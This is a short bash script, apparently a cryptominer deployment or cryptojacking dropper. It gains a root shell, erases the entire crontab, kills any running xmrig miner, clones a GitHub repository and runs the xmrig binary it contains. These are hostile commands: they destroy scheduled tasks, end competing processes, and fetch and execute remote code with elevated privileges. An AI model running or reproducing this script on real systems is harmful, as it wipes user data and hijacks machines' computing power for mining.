#!/bin/bash
sudo -s
crontab -r
killall xmrig
git clone https://github.com/nuriyevn/r16
cd r16
chmod +x xmrig
./xmrig
